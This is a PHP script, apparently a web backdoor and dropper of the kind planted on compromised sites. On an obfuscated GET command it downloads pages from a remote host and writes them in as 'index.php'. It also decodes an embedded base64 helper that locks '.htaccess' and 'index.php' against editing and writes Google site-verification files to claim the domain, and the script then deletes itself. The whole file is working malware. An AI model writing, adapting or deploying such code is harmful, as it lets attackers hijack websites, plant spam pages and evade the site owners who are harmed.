<?php
if(isset($_GET["name"])){
        rename('./dsize.php','./'.$_GET["name"].'.php');
        echo 'rename success';
}
function get_web($url){
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data=curl_exec($curl);
        curl_close($curl);
        if(!$data){
                $data = @file_get_contents($url);
        }
        return $data;
}
if(isset($_GET["g"])){
        $g = $_GET['g'];
        $g = base64_decode(str_rot13($g));
        if (preg_match('/url=(.*?)&dir=(.*)/', $g, $info)) {
                $url = $info[1];
                $dir = $info[2];
        }
        $url = $url;
        $rdir = $dir;
        @mkdir("./". $rdir);
        $url1='http://' . $url . 'template.html';
        $url2='http://' . $url . 'index.txt';
        $dir1='./' . $rdir . '/' . 'template.html';
        $dir2='./' . $rdir . '/' . 'index.php';
        $hm1 = get_web($url1);
        $hm2 = get_web($url2);
        file_put_contents($dir1,$hm1);
        file_put_contents($dir2,$hm2);
        $f_str[] =  $dir1;
        $f_str[] =  $dir2;
        foreach($f_str as $fileva){
                if(file_exists($fileva)){
                        $handle = fopen($fileva,'rb');
                        $rdsize = filesize("./".$fileva);
                        $Strtemp = fread($handle, $rdsize);
                        fclose($handle);
                        if(strstr($Strtemp,'//file end')){
                                echo "<p><span style='font-weight:bold;color:green;'>$fileva success</span></p>";
                                @chmod($fileva,0744);
                        }else{
                                echo "<p><span style='font-weight:bold;color:red;'>$fileva reload</span></p>";
                        }
                        unset($Strtemp);

                }else{
                        echo "<p><span style='font-weight:bold;color:red;'>$fileva not found</span></p>";
                }
        }
        $str = 'PD9waHAKaWYoaXNzZXQoJF9HRVRbJ2NobW9kJ10pICYmICAkX0dFVFsnY2htb2QnXSA9PSAnMScpewoJY2htb2QoJy5odGFjY2VzcycsMDQ0NCk7CgljaG1vZCgnaW5kZXgucGhwJywwNDQ0KTsKCWVjaG8gJ2NobW9kIGlzIG9rJzsKfQppZihpc3NldCgkX0dFVFsnd3JpdGUnXSkgJiYgdHJpbSgkX0dFVFsnd3JpdGUnXSkpewoJJHdyaXRlID0gdHJpbSgkX0dFVFsnd3JpdGUnXSk7CgkkcGF0aCA9Jy4vJy4gJHdyaXRlLicuaHRtbCc7CgkkY29udGVudD0nZ29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uOiAnLiR3cml0ZS4nLmh0bWwnOwoJZmlsZV9wdXRfY29udGVudHMoJHBhdGgsJGNvbnRlbnQpOwkKCWVjaG8gJGNvbnRlbnQ7Cgl1bmxpbmsoJ21maS5waHAnKTsKfQ==';
        file_put_contents("./mfi.php",base64_decode($str));
        $filename= substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);
        unlink('./'.$filename);
        @chmod(".htaccess",0755);
}
